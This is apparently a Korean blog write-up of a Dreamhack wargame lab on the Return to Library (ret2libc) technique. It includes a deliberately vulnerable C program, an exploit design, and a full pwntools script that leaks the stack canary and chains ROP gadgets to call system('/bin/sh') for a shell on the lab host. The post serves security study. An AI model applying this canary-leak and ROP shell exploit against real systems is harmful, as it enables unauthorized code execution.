---
layout: post
title: "Return To Library(RTL)"
categories: [System Hacking]
tags: [Exploit, Return to Libc, Buffer Overflow, ROP]
last_modified_at: 2024-01-31
---

Exploit Tech: Return to Library  
Return to Library  
프로세스 실행 권한이 있는 메모리 영역: 바이너리의 코드 영역, 라이브러리의 코드 영역  
코드 영역에 반환 주소 덮는 공격 기법 고안  
리눅스에서 C언어로 작성된 프로그램이 참조하는 libc 라이브러리: system, execve 같은 실행 함수 존재..  
libc로 NX 우회 -> 셸 획득  
위 과정을 Return To Libc  
libc가 아닌 다른 라이브러리 사용 -> Return To Library  

## 분석  

```cpp
// Name: rtl.c
// Compile: gcc -o rtl rtl.c -fno-PIE -no-pie

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

const char* binsh = "/bin/sh";

int main() {
  char buf[0x30];

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Add system function to plt's entry
  system("echo 'system@plt'");

  // Leak canary
  printf("[1] Leak Canary\n");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Overwrite return address
  printf("[2] Overwrite return address\n");
  printf("Buf: ");
  read(0, buf, 0x100);

  return 0;
}
```

checksec으로 바이너리에 적용된 보호 기법 파악  

![checksec](https://blog.kakaocdn.net/dna/dY3852/btsEbAPGf84/AAAAAAAAAAAAAAAAAAAAAFQye3LwN58qVsDBCXsNCCainm0Tfnt8L4qT53PWAy5F/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=CwGKq0mb3e0p1EXMG5zVO9VFaoM%3D)  

카나리, NX, ASLR(본문에는 안 써져 있지만 리눅스 커널에 기본 적용되어 있음)  

## 코드 분석  

**1. "/bin/sh"**  
```cpp
const char* binsh = "/bin/sh";
```
코드 섹션에 추가하기 위함. ASLR이 적용되어도 PIE 적용이 안됐으면 코드 세그먼트와 데이터 세그먼트 주소 고정.  
복습) binsh는 데이터 세그먼트에 위치, "/bin/sh" 문자열은 rdata 세그먼트에 위치  
PIE 적용이 안됐으므로, 코드 세그먼트와 데이터 세그먼트의 주소 고정  

**2. system 함수 PLT에 추가**  
```cpp
// Add system function to plt's entry
  system("echo 'system@plt'");
```
PIE 적용이 안되어 있으면 PLT 주소도 고정  
PLT에 어떤 라이브러리 함수 등록 -> PLT 엔트리 실행함으로써 함수 실행 가능  
무작위 주소에 매핑되는 라이브러리 베이스 주소 but PLT 주소를 이용해서 라이브러리 함수 실행 가능  
-> Return to PLT  

**3. 버퍼 오버플로우**  
```cpp
  // Overwrite return address
  printf("[2] Overwrite return address\n");
  printf("Buf: ");
  read(0, buf, 0x100);
```
오버플로우 발생.. 이를 이용하여 스택 카나리 우회, RET 덮어쓰기  

## 익스플로잇 설계  

**1. 카나리 우회**  
**2. rdi값을 "/bin/sh"의 주소로 설정 및 셸 획득**  
system("/bin/sh")를 호출하여 셸 획득.. 인자 전달 호출 규약에 따라 rdi="/bin/sh"이면서 system 호출  
-> 이를 위해 리턴 가젯 활용  

**3. 리턴 가젯**  
ret 명령어로 끝나는 어셈블리 코드 조각  
ROPgadget 명령어로 가젯 구할 수 있음  

![ROPgadget](https://blog.kakaocdn.net/dna/A6C88/btsEaV04Jje/AAAAAAAAAAAAAAAAAAAAAPN1MyIRU02sBhSE2DLrM9dnJpbeYwEgYfFS3XA06Qk_/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=106Bk%2FeNAW5pu1R9AFQp8sLLwMs%3D)  

리턴 가젯을 사용  
우리가 보는 거 반대로 넣어줘야 함  
원래 순서는 system 입력 후에 문자열 넣고 그 문자열을 rdi에 pop함  
ret에는 pop 먼저 부르고 문자열 삽입 후 system이 마지막  

```shell
addr of ("pop rdi; ret")   <= return address
addr of string "/bin/sh"   <= ret + 0x8
addr of "system" plt       <= ret + 0x10
```

## 익스플로잇  

**1. 카나리 우회**  
```python
from pwn import *

p=remote() 

def slog(n,m): return success(': '.join([n,hex(m)]))
context.arch='amd64' 

p.recvline()
payload=b'A'*(0x39)
p.sendafter(b'Buf: ',payload)
p.recvuntil(payload)
cnry=u64(b'\x00'+p.recvn(7))
slog('Canary',cnry)
```

계산해봐야 함 0x40(buf에서 sfp까지)-0x8(canary 크기) 계산하면 0x38 크기가 buf와 canary 거리..  
canary \x00까지 덮어줘야 하므로 0x39만큼 덮어줘야함  
hex 계산에 유의하자(40-8=32 아니다..)  

**2. 리턴 가젯 찾기**  
ROPgadget 설치  

![ROPgadget](https://blog.kakaocdn.net/dna/bSV3js/btsEdLC7FIy/AAAAAAAAAAAAAAAAAAAAAJlEVE6DyQaO0sytHU-_btbuopWjpMBYZChFeKMGuci8/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=pU9i6NMhwlj7Dh%2BCffRa642unHI%3D)  

--re 옵션: 정규표현식으로 가젯 필터링  
왼쪽 16진수가 가젯의 주소.. 0x0000000000400853  

**3. 익스플로잇**  
```shell
addr of ("pop rdi; ret")   <= return address
addr of string "/bin/sh"   <= ret + 0x8
addr of "system" plt       <= ret + 0x10
```

![Exploit](https://blog.kakaocdn.net/dna/H2nkU/btsEb95piSQ/AAAAAAAAAAAAAAAAAAAAAJfIwolYnjA1L7-kuYmEDwJHMbfIfY1JiNj-ZlzLERvf/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=9ljvgpRnCwhEfkSNbHpB3EY2IPQ%3D)  

system@plt 주소 0x4005d0  

**익스플로잇 작성 시 유의점**  
system 함수로 rip 이동 -> 스택 0x10 단위 정렬  
system 내부 movaps 명령어 때문..  

system 익스플로잇을 잘 작성했는데 segmetation fault 발생 -> system 함수 가젯 8바이트 뒤로 미뤄보기  
no-opgadget 추가 (아래 익스플로잇 코드에서는 ret 추가)  

```python
# Dynamically-Linked된 바이너리 대상 문제 풀 때 사용 
e=ELF('./rtl') 

system_plt=e.plt['system'] 
binsh=0x400874 
pop_rdi=0x0000000000400853 
ret=0x0000000000400285 

payload2=b'A'*0x38+p64(cnry)+b'B'*0x8 
payload2+=p64(ret) 
payload2+=p64(pop_rdi) 
payload2+=p64(binsh)
payload2+=p64(system_plt) 

pause()
p.sendafter(b'Buf: ',payload2) 

p.interactive()
```

**4. 풀 익스플로잇**  
```python
from pwn import *

p=remote('host3.dreamhack.games',16901)

def slog(n,m): return success(': '.join([n,hex(m)]))
context.arch='amd64'

p.recvline()
payload=b'A'*(0x39)
p.sendafter(b'Buf: ',payload)
p.recvuntil(payload)
cnry=u64(b'\x00'+p.recvn(7))
slog('Canary',cnry)

# Dynamically-Linked된 바이너리 대상 문제 풀 때 사용
e=ELF('./rtl')

system_plt=e.plt['system']
binsh=0x400874
pop_rdi=0x0000000000400853
ret=0x0000000000400285

payload2=b'A'*0x38+p64(cnry)+b'B'*0x8
payload2+=p64(ret)
payload2+=p64(pop_rdi)
payload2+=p64(binsh)
payload2+=p64(system_plt)

pause()
p.sendafter(b'Buf: ',payload2)

p.interactive()
```

![Full Exploit](https://blog.kakaocdn.net/dna/czw1wX/btsEd0UkNd7/AAAAAAAAAAAAAAAAAAAAAGdY_TfxaAockV4rmCxMx814kVQt8WE_JxEvA9eQGBPu/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=h94j1hCE%2Fkh8h6I2Qs%2Fd4%2FOdiS4%3D)